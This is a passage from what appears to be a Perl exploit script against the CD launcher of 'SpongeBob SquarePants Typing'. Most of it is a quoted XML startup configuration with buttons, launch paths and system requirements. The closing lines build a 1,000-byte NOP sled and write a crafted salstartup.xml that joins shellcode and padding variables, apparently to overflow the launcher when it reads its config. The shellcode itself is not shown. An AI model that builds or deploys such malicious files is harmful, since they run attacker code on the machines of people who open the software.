<style>tlc</style>
    <age>4To6</age>
    <rscFile>default</rscFile>
  </signin>
  <disk1>
    <filename>E:\TLC\383167-CD</filename>
    <cdName>"SpongeBob SquarePants Typing"</cdName>
  </disk1>
  <screenRSC>salstartup.rsc</screenRSC>
  <screen>
    <element>
      <condition>all</condition>
      <type>scene</type>
      <id>9100</id>
    </element>
    <element>
      <condition>all</condition>
      <type>toon</type>
      <x>0</x>
      <y>0</y>
      <id>9100</id>
      <startFrame>1</startFrame>
    </element>
    <mainPlayButton>
      <condition>all</condition>
      <type>fob</type>
      <class>play</class>
      <cdCheck>disk1</cdCheck>
      <target>"C:\Program Files\The Learning Company\SpongeBob SquarePants Typing\SPT.exe"</target>
      <postLaunch>wait</postLaunch>
      <x>461</x>
      <y>60</y>
      <id>9124</id>
    </mainPlayButton>
    <helpButton>
      <condition>all</condition>
      <type>fob</type>
      <class>extension</class>
      <cdCheck></cdCheck>
      <target>"C:\Program Files\The Learning Company\SpongeBob SquarePants Typing\User&apos;s Guide.pdf"</target>
      <parameters></parameters>
      <postLaunch>wait</postLaunch>
      <x>543</x>
      <y>158</y>
      <id>9126</id>
    </helpButton>
    <uninstallButton>
      <condition>all</condition>
      <type>fob</type>
      <class>uninstall</class>
      <target>C:\WINDOWS\TLCUninstall.exe</target>
      <parameters>-l</parameters>
      <crc>"C:\Program Files\The Learning Company\SpongeBob SquarePants Typing\Uninstall.xml"</crc>
      <postLaunch>exit</postLaunch>
      <x>514</x>
      <y>373</y>
      <id>9125</id>
    </uninstallButton>
    <onlineButton>
      <condition>all</condition>
      <type>fob</type>
      <class>link</class>
      <cdCheck></cdCheck>
      <target>http://redirect.expressit.com/redirect.asp?resku=383167&amp;action_id=Launcher</target>
      <parameters></parameters>
      <postLaunch>wait</postLaunch>
      <x>538</x>
      <y>263</y>
      <yy>375</yy>
      <id>9130</id>
    </onlineButton>
    <EregButton>
      <condition>all</condition>
      <type>fob</type>
      <class>install</class>
      <cdCheck></cdCheck>
      <target>"C:\Program Files\The Learning Company\SpongeBob SquarePants Typing\ereg\ereg32.exe"</target>
      <parameters></parameters>
      <postLaunch>wait</postLaunch>
      <x>522</x>
      <y>324</y>
      <id>9129</id>
    </EregButton>
    <SellScreen>
      <condition>all</condition>
      <type>fob</type>
      <class>link</class>
      <cdCheck>disk1</cdCheck>
      <target>startup:startup/BrandingPage</target>
      <parameters></parameters>
      <postLaunch>wait</postLaunch>
      <x>543</x>
      <y>207</y>
      <id>9128</id>
    </SellScreen>
  </screen>
  <BrandingPage>
    <element>
      <condition>all</condition>
      <type>toon</type>
      <id>5000</id>
    </element>
    <screenSaverButton>
      <condition>all</condition>
      <type>fob</type>
      <class>install</class>
      <cdCheck>disk1</cdCheck>
      <target>E:\SailorificStuff\sbscreen_setup.exe</target>
      <parameters></parameters>
      <postLaunch>wait</postLaunch>
      <x>546</x>
      <y>188</y>
      <id>5054</id>
    </screenSaverButton>
    <backButton>
      <condition>all</condition>
      <type>fob</type>
      <class>link</class>
      <target>startup:startup/screen</target>
      <x>537</x>
      <y>263</y>
      <id>5055</id>
    </backButton>
  </BrandingPage>
  <sysReq>
    <execute>yes</execute>
    <pc>
      <processor>
        <family>pentium</family>
        <speed>266</speed>
        <msgType>warn</msgType>
        <msgText>"266 MHz Pentium or faster is recommended."</msgText>
      </processor>
      <os>
        <Win95>no</Win95>
        <Win98>yes</Win98>
        <WinMe>yes</WinMe>
        <WinNT4>no</WinNT4>
        <Win2000>yes</Win2000>
        <WinXP>yes</WinXP>
        <msgType>warn</msgType>
        <msgText>"You operating system is not supported. Play at your own risk!"</msgText>
      </os>
      <diskSpace>
        <mbAvailable>100</mbAvailable>
        <msgType>ignore</msgType>
        <msgText>"There is not enough hard disk space available to play!"</msgText>
      </diskSpace>
      <physicalRAM>
        <mbAvailable>64</mbAvailable>
        <msgType>warn</msgType>
        <msgText>"There is not enough RAM available to play!"</msgText>
      </physicalRAM>
      <availableRAM>
        <mbAvailable>64</mbAvailable>
        <msgType>warn</msgType>
        <msgText>You are low on memory!</msgText>
      </availableRAM>
      <display>
        <width>800</width>
        <height>600</height>
        <bits>16</bits>
        <msgType>fail</msgType>
        <msgText>"Your display is not capable of 800 x 600 16-bit, thousands of colors."</msgText>
      </display>
      <sound>
        <msgType>fail</msgType>
        <msgText>"WAVE driver is not available."</msgText>
      </sound>
    </pc>
    <mac>
      <processor>
        <family>ppc</family>
        <speed>233</speed>
        <msgType>warn</msgType>
        <msgText>"233 MHz Powerpc or faster is recommended."</msgText>
      </processor>
      <os>
        <minVersion>0860</minVersion>
        <msgType>fail</msgType>
        <msgText>"You must run System 8.6 or above!"</msgText>
      </os>
      <osX>
        <minVersion>1004</minVersion>
        <msgType>fail</msgType>
        <msgText>"You must run OSX 10.04 or above!"</msgText>
      </osX>
      <diskSpace>
        <mbAvailable>100</mbAvailable>
        <msgType>ignore</msgType>
        <msgText>"There is not enough hard disk space available to play!"</msgText>
      </diskSpace>
      <physicalRAM>
        <mbAvailable>64</mbAvailable>
        <msgType>warn</msgType>
        <msgText>"There is not enough RAM available to play!"</msgText>
      </physicalRAM>
      <availableRAM>
        <mbAvailable>0</mbAvailable>
        <msgType>warn</msgType>
        <msgText></msgText>
      </availableRAM>
      <colorDepth>
        <minBits>16</minBits>
        <msgType>warn</msgType>
        <msgText>"Your display is not capable of 16-bit, thousands of colors."</msgText>
      </colorDepth>
      <sound>
        <available>ignore</available>
        <msgType>ignore</msgType>
        <msgText></msgText>
      </sound>
    </mac>
  </sysReq>
</startup>';

my $slide = "\x90" x 1000;

open(myfile,'>salstartup.xml');
print myfile $rattle.$diaper.$jumprope.$pacifier.$shellcode.$slide.$playpen;
